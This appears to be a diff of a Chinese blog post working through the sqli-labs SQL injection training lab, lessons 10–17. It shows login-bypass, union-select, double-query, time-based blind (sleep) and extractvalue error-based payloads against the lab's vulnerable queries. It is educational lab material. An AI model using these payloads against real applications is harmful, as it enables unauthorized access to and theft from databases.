@@ -572,16 +572,20 @@
 <h1 id="les10-GET-Blind-Time-based-Double-Quotes-String"><a href="#les10-GET-Blind-Time-based-Double-Quotes-String" class="headerlink" title="les10:GET-Blind- Time based- Double Quotes- String"></a>les10:GET-Blind- Time based- Double Quotes- String</h1><p>只需把les9的’改为”即可</p>
 <h1 id="les11-POST-Error-Based-Single-quotes-String"><a href="#les11-POST-Error-Based-Single-quotes-String" class="headerlink" title="les11:POST-Error Based-Single quotes-String"></a>les11:POST-Error Based-Single quotes-String</h1><img src="/2019/07/25/sqli-labs-master/start.png" title="start">
 <!--more-->
-<p>一开始如上图所示.<br>由题得知这是一道POST报错型(单引号那种语句)的题<br>有了前面简单的GET类型的题,那么就先试一下</p>
+<p>一开始如上图所示.
+由题得知这是一道POST报错型(单引号那种语句)的题
+有了前面简单的GET类型的题,那么就先试一下</p>
 <blockquote>
-<p>Username:admin<br>Password:1</p>
+<p>Username:admin
+Password:1</p>
 </blockquote>
 <p>然后就</p>
 <img src="/2019/07/25/sqli-labs-master/failed1.png" title="failed">
 
 <p>再试试</p>
 <blockquote>
-<p>Username:admin<br>Password:1’ or 1=1 %23</p>
+<p>Username:admin
+Password:1’ or 1=1 %23</p>
 </blockquote>
 <img src="/2019/07/25/sqli-labs-master/failed2.png" title="failed">
 
@@ -589,9 +593,11 @@
 <blockquote>
 <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p>
 </blockquote>
-<p>就知道这#不能用%23了…都是GET顺手的锅都是顺手的锅<br>把%23改为#之后</p>
+<p>就知道这#不能用%23了…都是GET顺手的锅都是顺手的锅
+把%23改为#之后</p>
 <blockquote>
-<p>Username:admin<br>Password:1’ or 1=1#</p>
+<p>Username:admin
+Password:1’ or 1=1#</p>
 </blockquote>
 <img src="/2019/07/25/sqli-labs-master/successfully.png" title="successfully">
 
@@ -603,11 +609,14 @@
 <blockquote>
 <p>1’ order by 2#</p>
 </blockquote>
-<p>没问题,所以只有两列<br>看了一下源码:</p>
+<p>没问题,所以只有两列
+看了一下源码:</p>
 <blockquote>
 <p>$sql=”SELECT username, password FROM users WHERE username=’$uname’ and password=’$passwd’ LIMIT 0,1”;</p>
 </blockquote>
-<p>然而上面所做的…就是我看WP之前所能做的…<br>接下来,<a href="https://blog.csdn.net/qq_28295425/article/details/78905840" target="_blank" rel="noopener">看WP-Recar</a><br>发现原来是可以直接在username闭合然后注释掉后面的语句…我还以为要在password搞</p>
+<p>然而上面所做的…就是我看WP之前所能做的…
+接下来,<a href="https://blog.csdn.net/qq_28295425/article/details/78905840" target="_blank" rel="noopener">看WP-Recar</a>
+发现原来是可以直接在username闭合然后注释掉后面的语句…我还以为要在password搞</p>
 <blockquote>
 <p>Username:’ union select database(),version()#👇</p>
 </blockquote>
@@ -671,7 +680,10 @@
 <p>所以要从另一个角度看,题目说着是double injection,那就来double injection的操作吧</p>
 <p>复习一下double injection需要用到的函数:</p>
 <blockquote>
-<p>rand() 生成一个0-1的随机数<br>floor()取整<br>count()统计查询对象的总数<br>group by x 按x对查询结果进行分组</p>
+<p>rand() 生成一个0-1的随机数
+floor()取整
+count()统计查询对象的总数
+group by x 按x对查询结果进行分组</p>
 </blockquote>
 <p>具体原理可以看一下付杰博客的<a href="https://www.fujieace.com/penetration-test/sql-double-injection.html" target="_blank" rel="noopener">SQL双查询注入详解</a></p>
 <h2 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">') union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="string">'*'</span>,<span class="keyword">database</span>(),<span class="string">'*'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
@@ -688,7 +700,8 @@
 <p>试了几遍单引号和双引号都不行,投降查看源码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">'"'</span>.<span class="variable">$uname</span>.<span class="string">'"'</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">'"'</span>.<span class="variable">$passwd</span>.<span class="string">'"'</span>; </span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=<span class="variable">$uname</span> and password=<span class="variable">$passwd</span> LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
 
-<p>观察了一下是在uname和passwd的基础上两边都加’”(一个单引号一个双引号)<br>故payload为 </p>
+<p>观察了一下是在uname和passwd的基础上两边都加’”(一个单引号一个双引号)
+故payload为 </p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" 语句 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="库名-1"><a href="#库名-1" class="headerlink" title="库名"></a>库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'" union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">database</span>(),<span class="number">0x7e</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">14</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> informaition_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">#</span></span><br></pre></td></tr></table></figure>
@@ -736,7 +749,8 @@
 <p>小于105</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 
-<p>等于101<br>所以表名的第一个字母是’e’</p>
+<p>等于101
+所以表名的第一个字母是’e’</p>
 <h3 id="第一个表名"><a href="#第一个表名" class="headerlink" title="第一个表名"></a>第一个表名</h3><p>又经验得第一个表名是’emails’</p>
 <h3 id="第二个表名"><a href="#第二个表名" class="headerlink" title="第二个表名"></a>第二个表名</h3><p>根据经验第二个表名的第一个字母为’r’  ASCII码为114,下面来验证一下</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' or (if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>,<span class="keyword">sleep</span>(<span class="number">10</span>),<span class="literal">null</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure>
@@ -781,7 +795,8 @@
 <hr>
 <h1 id="les17-POST-Update-Query-Error-based-String"><a href="#les17-POST-Update-Query-Error-based-String" class="headerlink" title="les17:POST-Update Query- Error based - String"></a>les17:POST-Update Query- Error based - String</h1><p>这题目…第一次见update语句的题</p>
 <p>update:用于修改表中的数据</p>
-<p>用法:<br>UPDATE 表名 SET 列名 = 新值 WHERE 列名 = 表中某值</p>
+<p>用法:
+UPDATE 表名 SET 列名 = 新值 WHERE 列名 = 表中某值</p>
 <h2 id="猜语句-3"><a href="#猜语句-3" class="headerlink" title="猜语句"></a>猜语句</h2><p>用les15那种方法:</p>
 <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">username</span><span class="selector-pseudo">:admin'</span></span><br><span class="line"><span class="selector-tag">password</span><span class="selector-pseudo">:admin</span></span><br></pre></td></tr></table></figure>
 
@@ -858,7 +873,8 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' and (extractvalue(1,concat(0x7e,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>版权声明：上面这个payload为CSDN博主「wkend」的原创，遵循CC 4.0 by-sa版权协议，转载附上原文出处链接及此声明。<br>原文链接：<a href="https://blog.csdn.net/qq_34444097/article/details/83043678" target="_blank" rel="noopener">https://blog.csdn.net/qq_34444097/article/details/83043678</a></p>
+<p>版权声明：上面这个payload为CSDN博主「wkend」的原创，遵循CC 4.0 by-sa版权协议，转载附上原文出处链接及此声明。
+原文链接：<a href="https://blog.csdn.net/qq_34444097/article/details/83043678" target="_blank" rel="noopener">https://blog.csdn.net/qq_34444097/article/details/83043678</a></p>
 </blockquote>
 <p>我用他的payload还是爆不出来…</p>
 <hr>
